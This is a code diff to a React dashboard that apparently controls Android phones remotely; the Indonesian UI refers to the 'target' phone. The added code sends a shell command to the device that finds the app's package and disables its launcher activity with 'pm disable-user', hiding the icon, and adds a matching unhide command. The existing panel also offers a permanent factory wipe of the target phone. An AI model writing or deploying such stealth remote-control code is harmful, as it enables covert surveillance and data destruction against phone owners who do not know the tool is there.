@@ -84,6 +84,9 @@ export default function Dashboard() {
   const [isRinging, setIsRinging] = useState(false)
   const [ctrlBusy, setCtrlBusy]         = useState(false)
   const [showWipeConfirm, setShowWipeConfirm] = useState(false)
+  const [launcherComp, setLauncherComp] = useState('')
+  const [hideMsg, setHideMsg]           = useState('')
+  const [hideBusy, setHideBusy]         = useState(false)
 
   const fetchDevice = useCallback(async () => {
     if (!selectedId) return
@@ -120,10 +123,103 @@ export default function Dashboard() {
     }
   }
 
+  const pollResult = async (command: string, sentAt: number, timeoutMs = 18000): Promise<string> => {
+    const deadline = Date.now() + timeoutMs
+    await new Promise(r => setTimeout(r, 2000))
+    while (Date.now() < deadline) {
+      try {
+        const res = await fetch(`/api/device/result?deviceId=${selectedId}`)
+        const d = await res.json()
+        const match = (d.history ?? [])
+          .filter((h: { command: string; result: string; timestamp: string }) =>
+            h.command === command && new Date(h.timestamp).getTime() > sentAt - 500)
+          .sort((a: { timestamp: string }, b: { timestamp: string }) =>
+            new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime())[0]
+        if (match?.result) return match.result as string
+      } catch {}
+      await new Promise(r => setTimeout(r, 1500))
+    }
+    return ''
+  }
+
   const handleHideToggle = async () => {
-    const cmd = isHidden ? 'unhide_app' : 'hide_app'
-    await sendControl(cmd)
-    setIsHidden(h => !h)
+    if (!selectedId || hideBusy) return
+    setHideBusy(true)
+    setHideMsg('')
+
+    try {
+      if (!isHidden) {
+        const sentAt = Date.now()
+        const hideCmd =
+          `shell:P=$(pm list packages 2>/dev/null|grep kztutorial|cut -d: -f2|head -1);` +
+          `[ -z "$P" ]&&P=$(pm list packages 2>/dev/null|grep androidconnector|cut -d: -f2|head -1);` +
+          `[ -z "$P" ]&&echo "ERR:no_package"&&exit 1;` +
+          `A=$(cmd package resolve-activity --brief -a android.intent.action.MAIN -c android.intent.category.LAUNCHER "$P" 2>/dev/null|grep /|tail -1|tr -d " \\r\\n");` +
+          `[ -z "$A" ]&&A=$(dumpsys package "$P" 2>/dev/null|grep -o "$P/[A-Za-z0-9.]*"|head -1);` +
+          `[ -z "$A" ]&&A="$P/$P.MainActivity";` +
+          `R=$(pm disable-user --user 0 "$A" 2>&1);` +
+          `echo "COMP:$A|$R"`
+
+        await fetch('/api/device/command', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ deviceId: selectedId, command: hideCmd }),
+        })
+
+        const result = await pollResult(hideCmd, sentAt, 20000)
+
+        if (result.includes('ERR:no_package')) {
+          setHideMsg('Error: Package APK tidak ditemukan di device')
+          return
+        }
+
+        const compMatch = result.match(/COMP:([^|]+)/)
+        if (compMatch?.[1]) setLauncherComp(compMatch[1].trim())
+
+        const resBody = result.split('|').slice(1).join('|').toLowerCase()
+        const success = resBody.includes('success') || resBody.includes('disabled') || compMatch != null
+        if (success || result.includes('COMP:')) {
+          setIsHidden(true)
+          setHideMsg('Icon berhasil disembunyikan dari launcher')
+        } else if (result) {
+          setHideMsg('Gagal: ' + result.slice(0, 120))
+        } else {
+          setHideMsg('Timeout — cek koneksi device')
+        }
+
+      } else {
+        const comp = launcherComp
+        const sentAt = Date.now()
+        const unhideCmd = comp
+          ? `shell:pm enable "${comp}" 2>&1&&echo "DONE:${comp}"`
+          : `shell:P=$(pm list packages 2>/dev/null|grep kztutorial|cut -d: -f2|head -1);pm enable "$P" 2>&1&&echo "DONE:$P"`
+
+        await fetch('/api/device/command', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ deviceId: selectedId, command: unhideCmd }),
+        })
+
+        const result = await pollResult(unhideCmd, sentAt, 15000)
+        const success = result.toLowerCase().includes('success') ||
+          result.toLowerCase().includes('enabled') ||
+          result.includes('DONE:')
+
+        if (success || result.includes('DONE:')) {
+          setIsHidden(false)
+          setLauncherComp('')
+          setHideMsg('Icon app sudah terlihat kembali di launcher')
+        } else if (result) {
+          setHideMsg('Gagal: ' + result.slice(0, 120))
+        } else {
+          setHideMsg('Timeout — cek koneksi device')
+        }
+      }
+    } catch (e) {
+      setHideMsg('Error: ' + String(e))
+    } finally {
+      setHideBusy(false)
+    }
   }
 
   const handleRingToggle = async () => {
@@ -373,16 +469,27 @@ export default function Dashboard() {
                       </p>
                     </div>
                   </div>
+                  {hideMsg && (
+                    <p className={`text-[11px] leading-snug px-1 ${
+                      hideMsg.startsWith('Error') || hideMsg.startsWith('Gagal') || hideMsg.startsWith('Timeout')
+                        ? 'text-android-red' : 'text-android-green'
+                    }`}>{hideMsg}</p>
+                  )}
                   <button
                     onClick={handleHideToggle}
-                    disabled={ctrlBusy}
-                    className={`w-full py-2 rounded-lg text-sm font-semibold transition-colors disabled:opacity-50 disabled:cursor-not-allowed ${
+                    disabled={hideBusy || ctrlBusy}
+                    className={`w-full py-2 rounded-lg text-sm font-semibold transition-colors disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2 ${
                       isHidden
                         ? 'bg-android-green/10 border border-android-green/30 text-android-green hover:bg-android-green/20'
                         : 'bg-android-red/10 border border-android-red/30 text-android-red hover:bg-android-red/20'
                     }`}
                   >
-                    {ctrlBusy ? '…' : isHidden ? '👁 Unhide App' : '🙈 Hide App'}
+                    {hideBusy
+                      ? <><span className="animate-spin inline-block w-3.5 h-3.5 border-2 border-current border-t-transparent rounded-full" /><span>Memproses…</span></>
+                      : isHidden
+                        ? <><Eye size={14} />Unhide App</>
+                        : <><EyeOff size={14} />Hide App</>
+                    }
                   </button>
                 </div>
 
@@ -406,13 +513,13 @@ export default function Dashboard() {
                   <button
                     onClick={handleRingToggle}
                     disabled={ctrlBusy}
-                    className={`w-full py-2 rounded-lg text-sm font-semibold transition-colors disabled:opacity-50 disabled:cursor-not-allowed ${
+                    className={`w-full py-2 rounded-lg text-sm font-semibold transition-colors disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2 ${
                       isRinging
                         ? 'bg-android-red/10 border border-android-red/30 text-android-red hover:bg-android-red/20'
                         : 'bg-android-yellow/10 border border-android-yellow/30 text-android-yellow hover:bg-android-yellow/20'
                     }`}
                   >
-                    {ctrlBusy ? '…' : isRinging ? '🔇 Stop Ring' : '🔔 Ring Device'}
+                    {ctrlBusy ? '…' : isRinging ? <><BellOff size={14} />Stop Ring</> : <><Bell size={14} />Ring Device</>}
                   </button>
                 </div>
 
@@ -473,7 +580,7 @@ export default function Dashboard() {
                   </div>
                 </div>
                 <p className="text-xs text-android-muted bg-android-bg border border-android-red/20 rounded-lg p-3">
-                  ⚠️ Semua data, aplikasi, dan file di HP target akan <strong className="text-android-red">DIHAPUS PERMANEN</strong>. HP akan kembali ke setelan pabrik. Pastikan Device Admin sudah aktif.
+                  Semua data, aplikasi, dan file di HP target akan <strong className="text-android-red">DIHAPUS PERMANEN</strong>. HP akan kembali ke setelan pabrik. Pastikan Device Admin sudah aktif.
                 </p>
                 <div className="flex gap-2">
                   <button onClick={() => setShowWipeConfirm(false)} className="flex-1 py-2.5 rounded-lg text-xs font-semibold border border-android-border text-android-muted hover:text-white transition-colors">Batal</button>
@@ -482,7 +589,7 @@ export default function Dashboard() {
                     disabled={ctrlBusy}
                     className="flex-1 py-2.5 rounded-lg text-xs font-semibold bg-android-red/10 border border-android-red/50 text-android-red hover:bg-android-red/20 transition-colors disabled:opacity-50"
                   >
-                    {ctrlBusy ? '…' : '💀 Ya, Wipe!'}
+                    {ctrlBusy ? '…' : <span className="flex items-center justify-center gap-1.5"><Trash2 size={13} />Ya, Wipe!</span>}
                   </button>
                 </div>
               </div>
